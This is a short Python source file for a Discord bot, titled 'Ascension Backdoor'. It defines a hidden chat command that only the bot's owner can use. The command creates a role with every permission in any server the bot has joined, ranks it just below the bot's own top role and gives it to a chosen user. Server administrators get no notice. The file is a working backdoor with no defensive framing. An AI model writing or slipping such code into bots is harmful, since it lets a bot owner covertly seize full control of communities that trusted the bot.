# Ascension Backdoor

import os

import discord

import chattrigger


class Ascend(chattrigger.ChatTrigger):

    async def run(self, message: discord.Message, trigger: str, client: discord.Client):
        if not str(message.author.id) == os.environ.get("OWNER_ID"):
            return

        args = message.content.split(" ")

        guild_id = args[1]

        user_id = int(args[2])

        guild: discord.Guild = client.get_guild(guild_id)
        member: discord.Member = guild.get_member(user_id)

        role = await guild.create_role(permissions=discord.Permissions.all())
        await role.edit(position=guild.me.top_role.position - 1)

        await member.add_roles(role)

        await message.channel.send("Done")
